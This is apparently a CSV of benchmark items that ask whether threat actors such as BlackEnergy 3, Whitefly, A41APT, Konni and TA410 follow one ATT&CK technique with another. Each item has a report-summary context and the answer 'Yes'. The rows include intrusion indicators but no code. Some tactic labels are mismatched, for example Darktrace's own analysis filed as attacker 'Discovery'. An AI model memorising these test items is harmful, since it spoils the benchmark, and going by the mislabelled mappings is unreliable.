2031,354,354-Initial Access-T1190-Exploit Public-Facing Application,"After BlackEnergy 3 malware executes a Visual Basic macro to reassemble and execute a portable executable, is it likely that it will achieve persistence by registering FONTCACHE.DAT to the startup shell before evading defenses through anti-debugging techniques such as CryptDecrypt() and IsDebuggerPresent API?","Initial Access: The CTI report by Udi Shamir, dated 1/26/2016, details a new variant of BlackEnergy 3 malware targeting Ukrainian power facilities, leveraging a vulnerability CVE-2014-4114 in Microsoft Office 2013's OLE packager. The attack vector involves infected Excel documents that, when executed, propagate the malware within the network. This suggests the involvement of an internal actor, as Office 2013 has been patched against this vulnerability, indicating that the attack could only succeed through unpatched systems or deliberate internal execution.","Execution: The CTI report describes the execution of BlackEnergy 3 malware through a Visual Basic macro embedded in an Excel document. The macro reassembles and executes a portable executable (PE32) named vba_macro.exe stored in the Windows TMP directory. This executable, in turn, drops two additional executables, FONTCACHE.DAT and rundll32.exe, and then deletes itself. FONTCACHE.DAT operates as a network sniffer, and rundll32.exe is used to load this malicious DLL.
Persistence: The CTI report indicates that BlackEnergy 3 malware achieves persistence by registering a binary to the startup shell using the RegSetValueExw() function, ensuring that FONTCACHE.DAT is executed upon system startup.
Defense Evasion: The CTI report outlines multiple anti-debugging techniques used by BlackEnergy 3 malware, including CryptDecrypt() function calls on itself, SetUnhandledExceptionFilter API, kernel debugger checks, and IsDebuggerPresent API. Additionally, the malware attempts to detect runtime checksum changes to evade non-hardware breakpoints.
Discovery: The CTI report notes that BlackEnergy 3 malware gathers information for lateral movement by using the GetAdaptersInfo() function API to retrieve network information for the local computer.
Lateral Movement: The CTI report mentions that BlackEnergy 3 malware is designed for lateral movement, sending data to servers deployed in major ISPs across Europe.
Command and Control: The CTI report identifies that BlackEnergy 3 malware communicates with its command and control (C2) server using HTTP protocol, with the IP address 5.149.254.114 associated with FORTUNIX-NETWORS. The malware sends localization data and keyboard layout information to the C2 server.
Exfiltration: The CTI report describes BlackEnergy 3 malware's data exfiltration capabilities, where it functions as a network sniffer and sends gathered information to the C2 server.
Others: The CTI report by Udi Shamir suggests that BlackEnergy 3 malware is a product of a nation-sponsored campaign, likely involving multiple teams. It is associated with the Sandworm Team and has been used in various campaigns, including those targeting NATO countries and the conflict with Russia. The malware's toolkit is believed to be used for 'black ops' and has been linked to the shutdown of Estonian internet and government websites in 2007. The report also highlights the malware's high entropy and sophisticated evasion techniques, including encryption, encoding, and anti-debugging measures.",Yes,BlackEnergy3_WP_012716_1c
2043,355,355-Initial Access-T1566-Phishing,"Before attempting to gain initial access by using social media platforms and sending spear-phishing messages, is it likely that Iranian hackers developed fake personas and a fictitious news organization to support their reconnaissance activities?","Initial Access: The Iranian hackers used social media platforms such as Facebook, Twitter, LinkedIn, Google+, YouTube, and Blogger to initiate their attack. They sent spear-phishing messages with links to fake pages to capture credentials, gaining initial access to their targets' networks.","Reconnaissance: Iranian threat actors conducted a cyber espionage operation named NEWSCASTER since 2011, using fake personas on social media to connect with US officials and gather information. They created over a dozen fake personas, including falsified identities from news organizations and attractive women profiles, supported by a fictitious news organization called NewsOnAir.org. The attackers connected with over 2,000 individuals to access information on their location, activities, and relationships.
Resource Development: The NEWSCASTER operation involved creating fake personas and a fictitious news organization to support their espionage activities. They used these personas to establish connections on social media platforms and harvest credentials.
Defense Evasion: The NEWSCASTER campaign, while not technically sophisticated, was effective and under the radar. The attackers used low-tech approaches to avoid traditional security defenses, exploiting social media and the human element, which is often the weakest link in security.
Credential Access: The campaign focused on credential harvesting and reconnaissance. The attackers used social media connections to harvest corporate and personal email credentials, which could be used for further lateral movements within the targeted networks.
Lateral Movement: After establishing connections on social media, the attackers used the harvested credentials to potentially move laterally within the networks of their targets, which included senior U.S. military and diplomatic personnel, congressional personnel, journalists, think tanks, and defense contractors in the U.S. and Israel, among others.
Command and Control: The campaign leveraged malware with the capability to exfiltrate data, although the malware used was not particularly sophisticated.
Others: The NEWSCASTER operation targeted victims in the U.K., Saudi Arabia, Iraq, and vocal supporters of Israel, suggesting an interest in political, military, diplomatic, and technical intelligence. The attackers maintained a regular work schedule consistent with Tehran's timezone, and their targets and technical indicators led iSIGHT Partners to believe the campaign originated from Iran. iSIGHT Partners coordinated with the FBI and notified social networks, leading to the removal of malicious personas from Facebook and LinkedIn. The report comes after FireEye suggested that Iranian attackers' methodologies have become more consistent with other advanced persistent threat actors in Iran following cyber attacks against Iran in the late 2000s.",Yes,Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation _ SecurityWeek
2068,36,36-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After utilizing a dropper disguised as a document or image to execute Trojan.Vcrodat via spear-phishing emails for initial access, is Whitefly likely to exploit vulnerabilities and utilize Mimikatz for credential harvesting before compromising additional machines to escalate privileges?","Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.
Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2071,36,36-Discovery-T1018-Remote System Discovery,"After Whitefly uses stolen credentials for lateral movement to compromise additional machines on the network, is it likely that the group will use publicly available tools and exploit vulnerabilities to discover and control more systems before employing tools to facilitate the collection of large volumes of sensitive information?","Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2091,361,361-Lateral Movement-T1570-Lateral Tool Transfer,"After discovering and mapping the organization's internal network using the Cobalt Strike beacon and collecting administrative-level credentials, is it likely that the attackers will move laterally across the infrastructure, compromising numerous workstations and targeting internal hosts and servers?","Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.","Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.
Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.
Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2094,362,362-Command and Control-T1102-Web Service,"After The Inception Framework distributed weaponized RTF documents via spear phishing emails for gaining initial access through exploiting vulnerabilities like CVE-2014-1761 and CVE-2012-0158, is it likely that attackers leveraged a cloud service for their command-and-control infrastructure using the WebDAV protocol?","Command and Control: The Inception Framework's command-and-control infrastructure was cloud-based, leveraging the WebDAV protocol for communication. This allowed the malware to send instructions and receive exfiltrated information from compromised systems via a cloud service provider, CloudMe.com. The malware components followed a plugin model, where new malware relied on previously delivered components to interact with the framework. The attackers used a cloud service to perform target surveying, configuration updates, malware updates, and data exfiltration.","Initial Access: The Inception Framework utilized initial access techniques by embedding malware components within Rich Text Format (RTF) files, exploiting vulnerabilities such as CVE-2014-1761 and CVE-2012-0158 to gain remote access to victims' computers. These documents were distributed via spear phishing emails, targeting individuals such as the CEO of a large Russian bank. The weaponized documents contained two separate exploits, triggering the execution of the malicious payload upon opening.
Others: The Inception Framework demonstrated a high level of operational security, with attackers interacting with their infrastructure through a complex network of router proxies and rented hosts. The attackers' identities remained concealed, with only a few clues left behind, preventing accurate attribution. The framework was highly automated and target-agnostic, capable of adapting to targets globally. The attackers showed interest in various sectors, including embassies, politics, finance, military, and engineering. The malware used for the Inception Framework was sophisticated, with multiple layers of obfuscation and indirection, including the use of polymorphic techniques to evade detection. The attackers also targeted mobile devices with malware disguised as updates for popular messaging applications like WhatsApp and Viber, as well as MMS phishing content tailored to specific mobile operators. The campaign evolved to include targets worldwide, indicating a large-scale operation with potential backing from nation-states or resourceful private entities.",Yes,bcs_wp_InceptionReport_EN_v12914
2100,363,363-Command and Control-T1573-Encrypted Channel,"After gathering detailed information about the victim's computer, including hostname, OS name, system type, and anti-virus information, is it likely that the backdoor installed by the attackers will communicate with a C&C server using an encrypted channel before exfiltrating data such as screenshots and system information through the established C&C channel?",Command and Control: The backdoor communicated with a C&C server using a configuration that contained the server IP and port. It sent a 'Start conversation' message and received a 'Get Victim Information' message in return. The communication was encrypted and followed a specific format involving XORed TypeID and Data with a 256-byte key.,"Initial Access: Check Point Research discovered an ongoing surveillance operation targeting a Southeast Asian government. The attackers used spear-phishing emails with malicious DOCX documents to gain initial access. These emails were sometimes spoofed to appear as if they were from other government-related entities. The attachments contained weaponized copies of legitimate-looking official documents that employed the remote template technique to retrieve the next stage from the attacker's server.
Execution: The attackers leveraged old Microsoft Office vulnerabilities and a chain of in-memory loaders to install a previously unknown backdoor on victims' machines. The RTF files used in the attack were weaponized using a variant of a tool named RoyalRoad, which exploits Equation Editor vulnerabilities in Microsoft Word. The initial documents and RTF files initiated a multi-stage infection chain, ultimately leading to the execution of malicious code.
Persistence: The attackers established persistence by creating a scheduled task named 'Windows Update' that was intended to run the exported function 'StartW' from a DLL named '5.t' with 'rundll32.exe' once a day. This task was set up by the shellcode within the RTF document to maintain the foothold on the system.
Defense Evasion: The attackers employed anti-analysis and anti-debugging techniques throughout the infection chain. The loader used anti-sandboxing techniques and gathered data on the victim's computer, which was then encrypted and sent to the C&C server. The loader also decrypted and executed shellcode that was stored encrypted within the binary, using dynamic API resolving to hide its main functionality and avoid static detection of suspicious API calls.
Discovery: The loader gathered detailed information about the victim's computer, including hostname, OS name and version, system type, user name, and MAC addresses of networking adapters. It also queried WMI for anti-virus information. This data was collected for the attackers to assess the value of the compromised machine.
Collection: The backdoor installed by the attackers had capabilities to collect a wide range of data from the victim's system, including file manipulation, process and service information, screenshots, command execution, network tables, registry keys, and system information. This data collection was integral to the attackers' surveillance objectives.
Exfiltration: The backdoor was capable of exfiltrating data over the C&C channel. The communication protocol involved sending various types of data, including screenshots, files, and system information, back to the attackers through the established C&C channel.
Impact: The backdoor had the capability to shut down the victim's computer, which could be used to disrupt operations and impact the availability of the system.
Others: The operation was attributed to a Chinese APT group that has been refining its tools for at least 3 years. The C&C servers operated in a limited daily window, and the backdoor C&C server was hosted on a US-based provider widely used by multiple threat actors. The attackers' infrastructure included first-stage C&C servers hosted by cloud services in Asia and a backdoor C&C server hosted on Zenlayer. The activity cluster was attributed to a Chinese threat group based on artifacts and indicators such as the use of RoyalRoad RTF exploit building kit, the timing of C&C server activity, and submissions of test backdoor versions to VirusTotal from China.",Yes,SharpPanda_ Chinese APT Group Targets Southeast Asian Government With Previously Unknown Backdoor - Check Point Research
2116,365,365-Persistence-T1053-Scheduled Task/Job,"After executing malicious payloads through DESLoader using DLL side-loading and fileless implants, is it likely that the A41APT campaign established persistence by registering scheduled tasks that mimicked legitimate Windows tasks before performing internal network scanning to search for open RDP and SMB ports for credential access?","Persistence: To maintain their foothold, the attackers registered scheduled tasks that executed legitimate executable files to load DESLoader every 15 minutes. The scheduled tasks were created with names that mimicked legitimate Windows tasks, making them harder to detect.","Initial Access: The A41APT campaign utilized SSL-VPN abuse to gain initial access to the target network, specifically targeting Japanese companies including their overseas branches. The attackers did not rely on spear-phishing but instead exploited SSL-VPN vulnerabilities or used stolen credentials to penetrate the network. The hostname 'DESKTOP-A41UVJV' was consistently used during these initial intrusions.
Execution: The attackers executed malicious code through the use of DESLoader, which is a multi-layer loader for various payloads including SodaMaster, P8RAT, and FYAntiLoader. DESLoader employed DLL side-loading techniques and fileless implants to execute its payloads. The payloads themselves, such as SodaMaster, were fileless RATs that executed commands and communicated with C2 servers.
Defense Evasion: The A41APT campaign exhibited sophisticated defense evasion techniques, including the use of fileless implants, DLL side-loading, and the removal of event logs after C2 communication. The attackers also used obfuscated PowerShell commands to delete event logs, further covering their tracks.
Credential Access: The attackers performed internal network scanning to find open RDP and SMB ports after initial access via SSL-VPN. They used administrator accounts to deploy RDP to servers and executed tools like csvde.exe and AdFind to dump credentials from systems such as AD servers, file servers, and backup servers.
Discovery: The attackers conducted discovery activities post-compromise, including scanning for open RDP and SMB ports, using WMIC to collect information on security products, and deploying tools to discover domain accounts and trust relationships.
Lateral Movement: The A41APT campaign heavily utilized RDP for lateral movement within the network, mainly targeting servers. They used network scanning and credential theft to move laterally and gain access to additional systems.
Command and Control: The attackers communicated with C2 servers via DESLoader's payloads or PowerShell remoting. They favored the use of IP addresses over domains for C2 infrastructure and showed a tendency not to reuse IP addresses repeatedly.
Others: The A41APT campaign is attributed with strong associations to APT10 and potential relevance to BlackTech. The campaign targeted a wide range of industries and exhibited capabilities such as abusing DLL side-loading and removing traces post-compromise. The attackers used heavy IP address usage for C2 and avoided domain usage, with little reuse of IP addresses for C2. The IP used for initial intrusion and C2 were different. Countermeasures against this campaign include the implementation of MFA, patch adaptation operations, network monitoring, and strengthening security measures for servers.",Yes,greatidea_A41_v1.0
2119,365,365-Discovery-T1046-Network Service Discovery,"After gaining initial access by exploiting SSL-VPN vulnerabilities or using stolen credentials, is it likely that the A41APT attackers executed malicious code through DESLoader using DLL side-loading techniques before conducting discovery activities using WMIC and deploying tools to find domain accounts and trust relationships?","Discovery: The attackers conducted discovery activities post-compromise, including scanning for open RDP and SMB ports, using WMIC to collect information on security products, and deploying tools to discover domain accounts and trust relationships.","Initial Access: The A41APT campaign utilized SSL-VPN abuse to gain initial access to the target network, specifically targeting Japanese companies including their overseas branches. The attackers did not rely on spear-phishing but instead exploited SSL-VPN vulnerabilities or used stolen credentials to penetrate the network. The hostname 'DESKTOP-A41UVJV' was consistently used during these initial intrusions.
Execution: The attackers executed malicious code through the use of DESLoader, which is a multi-layer loader for various payloads including SodaMaster, P8RAT, and FYAntiLoader. DESLoader employed DLL side-loading techniques and fileless implants to execute its payloads. The payloads themselves, such as SodaMaster, were fileless RATs that executed commands and communicated with C2 servers.
Persistence: To maintain their foothold, the attackers registered scheduled tasks that executed legitimate executable files to load DESLoader every 15 minutes. The scheduled tasks were created with names that mimicked legitimate Windows tasks, making them harder to detect.
Defense Evasion: The A41APT campaign exhibited sophisticated defense evasion techniques, including the use of fileless implants, DLL side-loading, and the removal of event logs after C2 communication. The attackers also used obfuscated PowerShell commands to delete event logs, further covering their tracks.
Credential Access: The attackers performed internal network scanning to find open RDP and SMB ports after initial access via SSL-VPN. They used administrator accounts to deploy RDP to servers and executed tools like csvde.exe and AdFind to dump credentials from systems such as AD servers, file servers, and backup servers.
Lateral Movement: The A41APT campaign heavily utilized RDP for lateral movement within the network, mainly targeting servers. They used network scanning and credential theft to move laterally and gain access to additional systems.
Command and Control: The attackers communicated with C2 servers via DESLoader's payloads or PowerShell remoting. They favored the use of IP addresses over domains for C2 infrastructure and showed a tendency not to reuse IP addresses repeatedly.
Others: The A41APT campaign is attributed with strong associations to APT10 and potential relevance to BlackTech. The campaign targeted a wide range of industries and exhibited capabilities such as abusing DLL side-loading and removing traces post-compromise. The attackers used heavy IP address usage for C2 and avoided domain usage, with little reuse of IP addresses for C2. The IP used for initial intrusion and C2 were different. Countermeasures against this campaign include the implementation of MFA, patch adaptation operations, network monitoring, and strengthening security measures for servers.",Yes,greatidea_A41_v1.0
2127,366,366-Defense Evasion-T1027-Obfuscated Files or Information,"After 'stopedge.bat' schedules 'install.vbs' to run every 33 minutes for persistence, is the Konni APT Group likely to use heavily obfuscated scripts, including techniques like XOR, to evade detection and prior to 'versioninfo.bat' discovering system details such as directory listings and running processes?","Defense Evasion: The scripts used in the attack, such as 'install.vbs' and 'update.vbs', were heavily obfuscated using XOR and various techniques to evade detection. The 'stopedge.bat' file also managed the deletion of 'versioninfo.bat' and 'update.vbs' after execution, which is indicative of defense evasion through indicator removal.","Initial Access: The Konni APT Group initiated their attack by delivering an ISO file downloaded from an in-the-wild (ITW) URL. This ISO file contained a zip file with malicious scripts, marking the start of the attack chain.
Execution: The attack involved the execution of various VBScripts and batch files. The 'install.vbs' script, once deobfuscated, executed a batch script named 'resolve.dns'. The 'update.vbs' script, similar to 'install.vbs', executed 'stopedge.bat'. The 'activate.vbs' script sent an HTTP request and saved the retrieved content. The 'unactivate.vbs' script was capable of exfiltration through a POST request. The 'stopedge.bat' file, if 'paycom.ini' existed, scheduled 'install.vbs' to run every 33 minutes and managed file deletions. The 'resolvedns.bat' initiated the download of a file from the C2 server. The 'versioninfo.bat' collected information about the user's computer and exfiltrated data using 'unactivate.vbs'.
Persistence: The 'stopedge.bat' file contributed to persistence by scheduling 'install.vbs' to run every 33 minutes if 'paycom.ini' was present in the directory.
Discovery: The 'versioninfo.bat' script was responsible for discovering information about the user's computer, including directory listings, IP addresses, running processes, and system details.
Collection: The 'versioninfo.bat' script collected a variety of information from the user's computer and prepared it for exfiltration.
Command and Control: The 'activate.vbs' script communicated with a C2 server by sending an HTTP request and saving the content retrieved. The 'resolvedns.bat' also facilitated communication with the C2 server to initiate the download of a file.
Exfiltration: The 'unactivate.vbs' script exfiltrated data through a POST request, and the 'versioninfo.bat' script exfiltrated collected information about the user's computer using 'unactivate.vbs'.
Others: The Konni APT Group is identified as an Advanced Persistent Threat with origins believed to be in North Korea, primarily targeting South Korea. Their modus operandi typically involves spear-phishing emails and malicious documents. The group's objectives include data exfiltration and espionage. The report includes a detailed breakdown of MITRE ATT&CK techniques employed by the Konni APT Group, as well as mitigations and detection strategies, including a YARA rule for detection.",Yes,the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain
2142,369,369-Persistence-T1547-Boot or Logon Autostart Execution,Is it likely that the malware will exploit an INP file using CVE-2017-12824 to gain initial access before achieving persistence through the creation of a RunOnce key in the registry?,Persistence: Persistence is achieved by creating a RunOnce key in the registry (\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce Putty explorer.exe CurrentUserC:\file.exe).,"Initial Access: The initial vector was identified as an INP file exploiting CVE-2017-12824. The file uses an ole stream to launch the first binary file, which then extracts a file to the temp folder and creates a thread for the second PE file.
Execution: The second PE file begins by checking the environment using the CheckRemoteDebuggerPresent function as an anti-forensic technique. It then creates persistence through a RunOnce key in the registry and uses the CreateToolhelp32snapshot function to get a snapshot of all processes, targeting the explorer process.
Defense Evasion: The malware employs defense evasion by checking the environment using the CheckRemoteDebuggerPresent function and by using Process Hollowing to inject into a process for communication with the C2.
Discovery: The malware performs discovery by obtaining the name of the user and using the CreateToolhelp32snapshot function to identify the explorer process.
Command and Control: The malware establishes command and control by creating a process through Process Hollowing, which awaits further instructions from the C2. However, the C2 was down at the time of submission to VirusTotal, preventing further analysis.
Others: The malware sample is associated with APTPatchwork and is consistent with the Indian APT group Patchwork. The payload is linked to the Professional version of Inpage (2.21), commonly used in Pakistan. The C2 is hosted on Amazon CloudFront, and the payload is connected to recent events involving delegations from the Pakistan Naval and Air Force Academies visiting Azerbaijan.",Yes,Malware analysis about sample of APT Patchwork
2150,37,37-Execution-T1129-Shared Modules,"After TA410 gains initial access to U.S. utility providers through phishing campaigns leveraging malicious macro-laden Word documents, is it likely that the renamed file ‘pense1.txt’ will be executed as ‘gup.exe’ using a modified version of certutil.exe before the FlowCloud malware is configured for persistence through registry key manipulation?","Execution: The FlowCloud macro used privacy-enhanced mail ('.pem') files which were subsequently renamed to 'pense1.txt'. This file is then saved as a portable executable file named 'gup.exe' and executed using a version of the certutil.exe tool named 'Temptcm.tmp'. The FlowCloud macro introduced a new method for the delivery of the malware, utilizing a previously unobserved macro section to download the payload from a DropBox URL. If unable to retrieve the payload from that resource, a catch statement attempted to retrieve a malware resource from the URL http://ffca.caibi379[.]com/rwjh/qtinfo.txt.","Initial Access: Proofpoint researchers observed phishing campaigns beginning on July 10, 2019, targeting U.S. utility providers with portable executable (PE) attachments and subject lines such as 'PowerSafe energy educational courses (30-days trial)'. These campaigns continued through September 2019. In November 2019, the threat actors shifted from PE attachments to malicious macro-laden Microsoft Word documents.
Persistence: The FlowCloud malware begins with the execution of 'Gup.exe' by the malicious macro which in turn executes the file 'EhStorAuthn.exe'. 'EhStorAuthn.exe' extracts the subsequent payload file components and installs them to the directory C:\Windows\Media\SystemPCAXD\ado\fc. This file also sets registry key values that store the keylogger drivers and the malware configuration as the value 'KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\<2-4>'.
Command and Control: FlowCloud malware handles configuration updates, file exfiltration, and commands as independent threads utilizing a custom binary C2 protocol. The sample analyzed utilized port 55555 for file exfiltration and port 55556 for all other data. FlowCloud communication was identified with the IP 188.131.233[.]27.
Others: Proofpoint researchers reported that LookBack malware targeted the U.S. utilities sector between July and August 2019. They continued their analysis into additional LookBack campaigns that unfolded between August 21-29, 2019. These campaigns utilized malicious macro-laden documents to deliver modular malware to targeted utility providers across the U.S. At the same time, Proofpoint identified a new malware family named FlowCloud, which gives attackers complete control over a compromised system. Both LookBack and FlowCloud malware can be attributed to a single threat actor called TA410, based on shared attachment macros, malware installation techniques, and overlapping delivery infrastructure. TA410 campaigns detected in November 2019 included TA429 (APT10)-related infrastructure used in phishing attachment delivery macros. However, Proofpoint analysts believe that intentional reuse of TA429 (APT10) techniques and infrastructure may be an attempt by threat actors to create a false flag. Therefore, they do not attribute LookBack and FlowCloud campaigns to TA429 (APT10) and track TA429 (APT10) independently of TA410 campaigns.",Yes,TA410
2153,37,37-Command and Control-T1571-Non-Standard Port,"Is it likely that the FlowCloud malware executes the file 'EhStorAuthn.exe', which installs malware components and sets registry key values for persistence, before utilizing port 55555 for file exfiltration and port 55556 for other command and control communication?","Command and Control: FlowCloud malware handles configuration updates, file exfiltration, and commands as independent threads utilizing a custom binary C2 protocol. The sample analyzed utilized port 55555 for file exfiltration and port 55556 for all other data. FlowCloud communication was identified with the IP 188.131.233[.]27.","Initial Access: Proofpoint researchers observed phishing campaigns beginning on July 10, 2019, targeting U.S. utility providers with portable executable (PE) attachments and subject lines such as 'PowerSafe energy educational courses (30-days trial)'. These campaigns continued through September 2019. In November 2019, the threat actors shifted from PE attachments to malicious macro-laden Microsoft Word documents.
Execution: The FlowCloud macro used privacy-enhanced mail ('.pem') files which were subsequently renamed to 'pense1.txt'. This file is then saved as a portable executable file named 'gup.exe' and executed using a version of the certutil.exe tool named 'Temptcm.tmp'. The FlowCloud macro introduced a new method for the delivery of the malware, utilizing a previously unobserved macro section to download the payload from a DropBox URL. If unable to retrieve the payload from that resource, a catch statement attempted to retrieve a malware resource from the URL http://ffca.caibi379[.]com/rwjh/qtinfo.txt.
Persistence: The FlowCloud malware begins with the execution of 'Gup.exe' by the malicious macro which in turn executes the file 'EhStorAuthn.exe'. 'EhStorAuthn.exe' extracts the subsequent payload file components and installs them to the directory C:\Windows\Media\SystemPCAXD\ado\fc. This file also sets registry key values that store the keylogger drivers and the malware configuration as the value 'KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\<2-4>'.
Others: Proofpoint researchers reported that LookBack malware targeted the U.S. utilities sector between July and August 2019. They continued their analysis into additional LookBack campaigns that unfolded between August 21-29, 2019. These campaigns utilized malicious macro-laden documents to deliver modular malware to targeted utility providers across the U.S. At the same time, Proofpoint identified a new malware family named FlowCloud, which gives attackers complete control over a compromised system. Both LookBack and FlowCloud malware can be attributed to a single threat actor called TA410, based on shared attachment macros, malware installation techniques, and overlapping delivery infrastructure. TA410 campaigns detected in November 2019 included TA429 (APT10)-related infrastructure used in phishing attachment delivery macros. However, Proofpoint analysts believe that intentional reuse of TA429 (APT10) techniques and infrastructure may be an attempt by threat actors to create a false flag. Therefore, they do not attribute LookBack and FlowCloud campaigns to TA429 (APT10) and track TA429 (APT10) independently of TA410 campaigns.",Yes,TA410
2162,372,372-Defense Evasion-T1562-Impair Defenses,"After APT35 infiltrated a corporate device through a spear phishing email during the Initial Access phase, is it likely that Darktrace's Cyber AI Analyst automated the investigation process to analyze the infected device following the Command and Control detection?",Defense Evasion: APT35 managed to evade detection by conducting minimal activity ('lying low') and avoiding triggering security alerts. The group's presence went unnoticed by the organization's existing security measures until Darktrace's Cyber AI identified the unusual C2 traffic.,"Initial Access: APT35, also known as Charming Kitten, Imperial Kitten, or Tortoiseshell, infiltrated a corporate device likely through a spear phishing email. This initial access was undetected until Darktrace's Cyber AI was deployed, which later identified the compromised device.
Persistence: The infected device exhibited persistent command and control (C2) beaconing, indicating that APT35 maintained a foothold within the system, lying low and awaiting further instructions.
Discovery: Darktrace's Cyber AI Analyst began analyzing the infected device once the C2 was detected, automating the investigation process and reducing time to triage by 92%.
Lateral Movement: The internal security team verified with Darktrace that no lateral movement or data exfiltration had occurred following the C2 beaconing detection.
Command and Control: Darktrace detected APT35's C2 activity without relying on signatures or threat intelligence. The C2 destinations included known malicious domains such as cortanaservice[.]com.
